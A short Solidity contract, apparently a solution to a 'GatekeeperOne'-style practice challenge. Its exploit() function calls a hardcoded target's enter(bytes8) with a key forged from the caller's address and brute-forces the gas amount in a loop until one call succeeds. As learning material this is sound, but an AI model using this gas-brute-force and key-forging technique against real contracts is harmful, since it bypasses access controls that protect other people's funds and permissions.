// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;

contract attack2 {
    //GatekeeperOne gatekeeperOne;
    address target = 0x3df5BfDe0C99F75af250f4979fc84124Af1264ff;
    address entrant;
    uint256 public gasLeft;

    function exploit() public {
        // 后四位是metamask上账户地址的低2个字节
       bytes8 key=0xAAAAAAAA0000adF0;
       for (uint256 i = 0; i < 120; i++) {
            (bool result, ) = target.call{gas:i + 150 + 8191 * 3}(  // modify the gas by one
                abi.encodeWithSignature(("enter(bytes8)"), key)  // call the fct enter with our key
            );
            if (result) { // if call success (no revert)
                break;  // end the loop
            }
        }
    }
}
